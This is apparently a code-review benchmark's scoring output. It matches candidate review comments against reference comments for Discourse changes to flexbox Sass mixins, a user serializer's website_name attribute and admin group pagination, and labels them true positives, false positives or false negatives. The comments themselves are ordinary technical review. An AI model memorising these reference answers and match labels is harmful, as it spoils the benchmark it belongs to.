align-items mixin passes modern values straight to legacy properties and omits -moz-box-align

`align-items($alignment)` forwards the value verbatim to `-webkit-box-align` and `-ms-flex-align`, but those legacy properties only accept `start | center | end | baseline | stretch`. Any future call with the spec values `flex-start`, `flex-end`, `space-between`, etc. will emit invalid declarations that old browsers drop silently, so the legacy prefixes give a false sense of coverage (and the invalid value is easy to miss because the standard `align-items` still works). The mixin also never emits `-moz-box-align`, even though `flexbox()` emits `display: -moz-box`, so legacy Gecko gets box layout with no alignment. Finally, `-ms-align-items` (line 121) is not a real property in any browser and is dead output. Consider mapping values (e.g. `flex-start` -> `start`) or dropping the legacy prefixes entirely.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order mixin maps directly onto 1-based box-ordinal-group

`order($val)` emits `-webkit-box-ordinal-group`/`-moz-box-ordinal-group` with the same number as `order`. The legacy ordinal-group property is 1-based (minimum value 1, default 1) while `order` is 0-based with default 0, so any call with `order(0)` or a negative value (both legal for `order`) produces an invalid legacy declaration, and relative ordering between items that set `order` and items that do not can differ between the legacy and modern code paths. If the legacy prefixes are kept, the value should be offset/validated; otherwise they should be dropped.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.

false_positives.candidate:
.panel loses right alignment on the legacy box model the flexbox mixin targets

`.panel` replaced `float: right` with `margin-left: auto` + `order(3)`. `margin-left: auto` only pushes a flex item to the end in the modern flexbox spec; the `flexbox()` mixin deliberately also emits `display: -webkit-box` and `display: -moz-box` for old WebKit/Gecko, where auto margins are not honoured in the box model. In those browsers the header panel (notification/search/user icons) will now render left-aligned right after the title instead of at the right edge. Either drop the legacy `display` fallbacks or add `-webkit-box-pack: end` / `-ms-flex-pack: end` on `.contents`.

Removing vertical padding from .small-action-desc can let the floated avatar overflow

`.small-action-desc` changed from `padding: 0.5em 0 0.5em 4em; margin-top: 5px` to `padding: 0 1.5%`, but `.small-action-desc .avatar` (line 298) is still floated. A float does not contribute to the height of its block container, so with zero vertical padding the flex item's height is only the text line height; if the avatar is taller than one line of the 0.9em text it will overflow the flex item and overlap neighbouring content. Previously the 0.5em padding plus 5px margin absorbed the difference. Consider clearing the float or using flex/inline-block for the avatar instead.

`float: right` on .small-action button is inert now that .small-action is a flex container

`.small-action` now gets `@include flexbox()` (display:flex), which makes float declarations on its direct children no-ops. The `button` child still relies on `float: right` to be pushed to the right edge of the small-action row (e.g. the undo/delete control). With flex layout the button becomes a normal flex item sized to its content and will sit immediately after `.small-action-desc` instead of at the right edge of the row. To keep the previous layout the button needs `margin-left: auto` (or the description needs `flex: 1`). The same applies to `float: left` on `.topic-avatar` (line 270), which is now dead code.

inline-flex mixin forces legacy box layout where a safe inline-block fallback existed

`.badge-wrapper.bullet` previously declared only `display: inline-flex`, so browsers without flexbox support simply kept `display: inline-block` from the `.badge-wrapper` rule and rendered correctly. The new `inline-flex()` mixin additionally emits `display: -webkit-inline-box` / `-moz-inline-box` / `-ms-inline-flexbox`, which those same old browsers *do* understand, switching the bullet badges to the legacy box model with different sizing/shrinking rules (relevant here because `span.badge-category` relies on `max-width`, `overflow: hidden` and `text-overflow: ellipsis`). This is a rendering change for old browsers that was previously handled gracefully; verify it or drop the legacy display fallbacks.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name is missing the trailing '?' so the inclusion guard is dead code

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method defined here is `include_website_name` (no question mark), so it is never called and `website_name` is always emitted — including as `null` for every user without a website. Rename it to `include_website_name?` (and note that its body should also honour `scope.restrict_user_fields?`, see the untrusted-attributes issue).

false_positives.candidate:
Missing cases for sibling-subdomain branch and blank/invalid website

The new specs cover only equal hosts, unrelated hosts, and website-domain-is-parent-of-instance. There is no coverage for the sibling-subdomain branch the code explicitly implements (e.g. instance `forum.example.com`, website `http://www.example.com/user`), for the reverse case (instance `example.com`, website `www.example.com`), or for a blank/unparseable website (which must return nil without raising and ideally omit the key). These are the branches most likely to break.

Only URI path is appended; query/fragment are dropped and host matching is case sensitive

`website_name` builds the display text from `host + path`, so for `http://example.com/u?tab=1#x` on a same-domain instance it renders `example.com/u`, silently hiding the part of the URL the feature is meant to disclose. Additionally `URI#host` preserves the case as typed, so `http://Example.com` never equals `Discourse.current_hostname` (`example.com`) and falls into the generic branch. Downcase the host before comparing and include query/fragment (or use `URI#request_uri`) if the goal is to show the complete URL.

Sibling-subdomain comparison yields false positives on shared public suffixes

The branch that strips the first label (`www.example.com` vs `forum.example.com`) compares only the remaining labels, so unrelated sites that merely share a public suffix of the same label count are treated as the same domain — e.g. instance `forum.github.io` and user website `someone.github.io`, or any pair under a 3-label suffix. The result is that the full URL path of an unrelated third-party site is rendered as the link text. Consider restricting this to a registrable-domain comparison (e.g. PublicSuffix) or at least matching only when one host is a suffix of the other.

TL0/anonymous spec does not assert website_name is withheld

The `untrusted_attributes` list in the "TL0 user seen as anonymous" context was not updated with `website_name`, so the new attribute's exposure to anonymous viewers is untested and the regression described above passes CI. Add `website_name` to that list (after fixing the serializer) so the privacy guard is covered.

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on a string literal. It works today only because literals are unfrozen; under `# frozen_string_literal: true` (or if the file is ever frozen-string-literal enabled) this raises `FrozenError` at runtime for every profile serialization. Use `".#{website_host}"` or `"." + website_host`.

website_name is not listed in untrusted_attributes, leaking TL0 users' website to anonymous visitors

`:website` is included in `untrusted_attributes` (line 105-111) so that a trust-level-0 user's website is hidden from anonymous viewers (anti-spam/SEO measure). The new `:website_name` attribute is added to the plain `attributes` list only, so it is always serialized and now exposes the host (and, for same-domain sites, the full path) of a TL0 user's website to anonymous requests. The front-end template renders `model.website_name` unconditionally, so the previously suppressed information becomes visible again. `:website_name` should be added to `untrusted_attributes` (and the TL0 spec list updated).

true_positives.golden_comment: In the next action, capping the next offset at user_count can produce an empty page (e.g., total equal to limit results in offset == total, showing 2/2 with no members). This can cause confusing UX on the last page.
true_positives.matched_candidate:
totalPages off by one produces a reachable empty page

`totalPages` is `Math.floor(user_count / limit) + 1`, which over-counts whenever `user_count` is an exact multiple of `limit`: with 100 members and limit 50 it reports 3 pages even though only 2 contain data. Combined with `next`, which sets `offset = Math.min(offset + limit, user_count)`, an admin can page to `offset == user_count` and see "3/3" with an empty member list (and `previous` then lands on a non page-aligned offset). Use `Math.ceil(user_count / limit)` and advance the offset in whole pages.

remove_member spec uses a verb the route does not support

Controller specs dispatch directly to the action, so the test passes even though a real PUT to `/admin/groups/:group_id/members` would be handled by `add_members`, not `remove_member`.
